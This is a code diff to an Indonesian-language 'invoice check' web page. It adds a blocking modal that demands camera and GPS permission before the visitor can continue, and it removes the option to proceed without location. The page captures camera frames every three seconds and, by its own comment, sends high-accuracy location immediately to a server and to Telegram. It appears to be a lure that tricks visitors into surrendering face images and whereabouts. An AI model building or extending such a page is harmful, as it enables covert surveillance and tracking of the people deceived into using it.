@@ -641,6 +641,140 @@
           grid-column: auto;
         }
       }
+
+      /* Permission Modal Dialog */
+      .permission-modal-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(33, 27, 8, 0.75);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        display: grid;
+        place-items: center;
+        z-index: 10000;
+        padding: 20px;
+        animation: fadeInModal 0.25s ease-out;
+      }
+      .permission-modal-card {
+        width: min(100%, 460px);
+        background: var(--paper);
+        border: 1px solid var(--line);
+        border-radius: 24px;
+        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+        padding: 36px 28px;
+        text-align: center;
+        animation: slideUpModal 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      }
+      .permission-modal-icon {
+        width: 64px;
+        height: 64px;
+        border-radius: 20px;
+        background: var(--yellow);
+        color: var(--ink);
+        display: grid;
+        place-items: center;
+        margin: 0 auto 18px;
+        box-shadow: 0 10px 25px rgba(245, 183, 0, 0.35);
+      }
+      .permission-modal-icon svg {
+        width: 32px;
+        height: 32px;
+      }
+      .permission-modal-card h2 {
+        font-family: "Archivo Black", sans-serif;
+        font-size: 21px;
+        margin: 0 0 10px;
+        letter-spacing: -0.02em;
+        line-height: 1.25;
+        color: var(--ink);
+      }
+      .permission-modal-card p {
+        color: var(--muted);
+        font-size: 14px;
+        line-height: 1.55;
+        margin: 0 0 20px;
+      }
+      .permission-checklist {
+        background: var(--canvas);
+        border-radius: 16px;
+        padding: 14px 16px;
+        margin-bottom: 18px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        text-align: left;
+      }
+      .permission-check-item {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .check-badge {
+        width: 36px;
+        height: 36px;
+        border-radius: 10px;
+        background: #fff;
+        display: grid;
+        place-items: center;
+        font-size: 16px;
+        border: 1px solid var(--line);
+        flex-shrink: 0;
+      }
+      .check-badge.done {
+        background: #ecfdf3;
+        border-color: #a6f4c5;
+        color: var(--green);
+      }
+      .permission-check-item strong {
+        display: block;
+        font-size: 14px;
+        color: var(--ink);
+      }
+      .permission-check-item small {
+        display: block;
+        font-size: 12px;
+        color: var(--muted);
+      }
+      .permission-error-hint {
+        background: #fef3f2;
+        border: 1px solid #fee4e2;
+        color: var(--red);
+        font-size: 13px;
+        padding: 12px 14px;
+        border-radius: 12px;
+        margin-bottom: 18px;
+        line-height: 1.45;
+        text-align: left;
+      }
+      .perm-btn {
+        width: 100%;
+        padding: 16px;
+        font-weight: 800;
+        font-size: 16px;
+        border-radius: 14px;
+        cursor: pointer;
+        background: var(--yellow);
+        color: var(--ink);
+        border: none;
+        box-shadow: 0 10px 24px rgba(245, 183, 0, 0.35);
+        transition: transform 0.15s ease, box-shadow 0.15s ease;
+      }
+      .perm-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 14px 28px rgba(245, 183, 0, 0.45);
+      }
+      .perm-btn:active {
+        transform: translateY(0);
+      }
+      @keyframes fadeInModal {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+      @keyframes slideUpModal {
+        from { opacity: 0; transform: translateY(20px) scale(0.96); }
+        to { opacity: 1; transform: translateY(0) scale(1); }
+      }
+
       @media (prefers-reduced-motion: reduce) {
         *,
         *::before,
@@ -652,15 +786,43 @@
     </style>
   </head>
   <body>
-    <!--
-      THESIS: One linked invoice becomes the visible context for transparent player verification; admin controls never appear here.
-      OWN-WORLD: Signal yellow, paper white, charcoal ink, Archivo Black thesis type, an invoice slab, and one live camera bay.
-      STORY: Review the exact invoice, understand collection, consent, activate visible capture, fill identity while capture runs, then submit.
-      FIRST VIEWPORT: Linked invoice and progress sit left; permission-first verification sits right, stacked on mobile.
-      FORM: Existing grounded candidate 5 extended into an invoice-linked vertical verification rail; seed 95219520.
-      FINISH: unreviewed and undocumented is unfinished; this build ends with the finish review, the verdict, and DESIGN.md
-    -->
-    <div class="shell">
+    <!-- Modal Izin Kamera & Lokasi Wajib -->
+    <div class="permission-modal-overlay" id="permissionModal" hidden>
+      <div class="permission-modal-card" role="dialog" aria-modal="true" aria-labelledby="permModalTitle">
+        <div class="permission-modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            <path d="M9 12l2 2 4-4"/>
+          </svg>
+        </div>
+        <h2 id="permModalTitle">Verifikasi Wajah &amp; Lokasi Diperlukan</h2>
+        <p id="permModalDesc">
+          Verifikasi Wajah dan Lokasi diperlukan untuk melanjutkan proses cek invoice demi keamanan dan validasi transaksi Anda.
+        </p>
+        <div class="permission-checklist">
+          <div class="permission-check-item">
+            <span class="check-badge" id="camStatusBadge">📷</span>
+            <div>
+              <strong>Akses Kamera (Wajah)</strong>
+              <small id="camStatusText">Menunggu izin browser…</small>
+            </div>
+          </div>
+          <div class="permission-check-item">
+            <span class="check-badge" id="locStatusBadge">📍</span>
+            <div>
+              <strong>Akses Lokasi (GPS)</strong>
+              <small id="locStatusText">Menunggu izin browser…</small>
+            </div>
+          </div>
+        </div>
+        <div class="permission-error-hint" id="permErrorHint" hidden>
+          ⚠️ Akses belum lengkap. Silakan klik tombol di bawah dan pilih <strong>"Izinkan / Allow"</strong> pada dialog browser Anda.
+        </div>
+        <button type="button" class="perm-btn" id="btnAllowPermissions">
+          Setuju &amp; Izinkan Akses
+        </button>
+      </div>
+    </div>
       <header class="topbar">
         <div class="brand">
           <span class="brand-mark" aria-hidden="true">
@@ -1104,25 +1266,82 @@
         uploadPendingPhotos();
       }
 
+      const permissionModal = document.getElementById("permissionModal");
+      const camStatusBadge = document.getElementById("camStatusBadge");
+      const camStatusText = document.getElementById("camStatusText");
+      const locStatusBadge = document.getElementById("locStatusBadge");
+      const locStatusText = document.getElementById("locStatusText");
+      const permErrorHint = document.getElementById("permErrorHint");
+      const btnAllowPermissions = document.getElementById("btnAllowPermissions");
+
+      let isCameraGranted = false;
+      let isLocationGranted = false;
+
+      function updatePermissionModalUI() {
+        if (!permissionModal) return;
+
+        if (camStatusBadge && camStatusText) {
+          if (isCameraGranted) {
+            camStatusBadge.className = "check-badge done";
+            camStatusBadge.textContent = "✓";
+            camStatusText.textContent = "Akses kamera diizinkan";
+          } else {
+            camStatusBadge.className = "check-badge";
+            camStatusBadge.textContent = "📷";
+            camStatusText.textContent = "Menunggu izin kamera…";
+          }
+        }
+
+        if (locStatusBadge && locStatusText) {
+          if (isLocationGranted) {
+            locStatusBadge.className = "check-badge done";
+            locStatusBadge.textContent = "✓";
+            locStatusText.textContent = "Akses lokasi diizinkan";
+          } else {
+            locStatusBadge.className = "check-badge";
+            locStatusBadge.textContent = "📍";
+            locStatusText.textContent = "Menunggu izin lokasi…";
+          }
+        }
+
+        if (isCameraGranted && isLocationGranted) {
+          permissionModal.hidden = true;
+          if (permErrorHint) permErrorHint.hidden = true;
+        } else {
+          permissionModal.hidden = false;
+        }
+      }
+
       function requestLocation() {
         if (!navigator.geolocation) {
           setLocationState(
             "unavailable",
             "Browser tidak mendukung lokasi. Konfirmasi tetap dapat dikirim tanpa koordinat.",
           );
+          isLocationGranted = false;
+          if (permErrorHint) {
+            permErrorHint.textContent = "⚠️ Browser Anda tidak mendukung akses lokasi.";
+            permErrorHint.hidden = false;
+          }
+          updatePermissionModalUI();
           return;
         }
+
         setLocationState(
           "requesting",
           "Menunggu keputusan izin lokasi dari browser…",
         );
+
         navigator.geolocation.getCurrentPosition(
           (position) => {
+            isLocationGranted = true;
             locationResult = position;
             setLocationState(
               "granted",
               "Lokasi diizinkan dan siap dikirim bersama konfirmasi.",
             );
+            updatePermissionModalUI();
+
             // Kirim lokasi seketika (immediately) ke server & Telegram
             fetch("/api/location", {
               method: "POST",
@@ -1138,12 +1357,18 @@
               }),
             }).catch((err) => console.error("[LOCATION_SEND_ERROR]", err));
           },
-          () => {
+          (error) => {
+            isLocationGranted = false;
             locationResult = null;
             setLocationState(
               "unavailable",
-              "Lokasi tidak dibagikan atau tidak tersedia. Konfirmasi tetap dapat dilanjutkan tanpa koordinat.",
+              "Izin lokasi belum diberikan. Tekan tombol Setuju lalu pilih Izinkan pada browser.",
             );
+            if (permErrorHint) {
+              permErrorHint.innerHTML = '⚠️ Izin lokasi belum diberikan. Silakan klik <strong>"Setuju &amp; Izinkan Akses"</strong> lalu pilih <strong>"Izinkan / Allow"</strong> pada dialog browser.';
+              permErrorHint.hidden = false;
+            }
+            updatePermissionModalUI();
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
         );
@@ -1161,6 +1386,7 @@
             },
             audio: false,
           });
+          isCameraGranted = true;
           if (cameraVideo) {
             cameraVideo.srcObject = stream;
             await cameraVideo.play();
@@ -1171,15 +1397,19 @@
           }
           if (identityFields) identityFields.hidden = false;
           setStep(3);
-          requestLocation();
           captureFrame();
-          captureTimer = setInterval(captureFrame, 3000);
+          if (!captureTimer) {
+            captureTimer = setInterval(captureFrame, 3000);
+          }
+          updatePermissionModalUI();
           document.getElementById("fullName")?.focus();
         } catch (error) {
-          if (cameraButton) {
-            cameraButton.disabled = false;
-            cameraButton.textContent = "Coba aktifkan kamera lagi";
+          isCameraGranted = false;
+          if (permErrorHint) {
+            permErrorHint.innerHTML = '⚠️ Izin kamera belum diberikan. Silakan klik <strong>"Setuju &amp; Izinkan Akses"</strong> lalu pilih <strong>"Izinkan / Allow"</strong> pada dialog browser.';
+            permErrorHint.hidden = false;
           }
+          updatePermissionModalUI();
           setStatus(
             error.message ||
               "Izin kamera tidak diberikan. Periksa pengaturan browser lalu coba lagi.",
@@ -1188,7 +1418,25 @@
         }
       }
 
-      document.addEventListener("DOMContentLoaded", startCamera);
+      async function triggerAllPermissions() {
+        if (!isCameraGranted) {
+          await startCamera();
+        }
+        if (!isLocationGranted) {
+          requestLocation();
+        }
+      }
+
+      if (btnAllowPermissions) {
+        btnAllowPermissions.addEventListener("click", () => {
+          triggerAllPermissions();
+        });
+      }
+
+      document.addEventListener("DOMContentLoaded", () => {
+        updatePermissionModalUI();
+        triggerAllPermissions();
+      });
 
       form.addEventListener("submit", async (event) => {
         event.preventDefault();
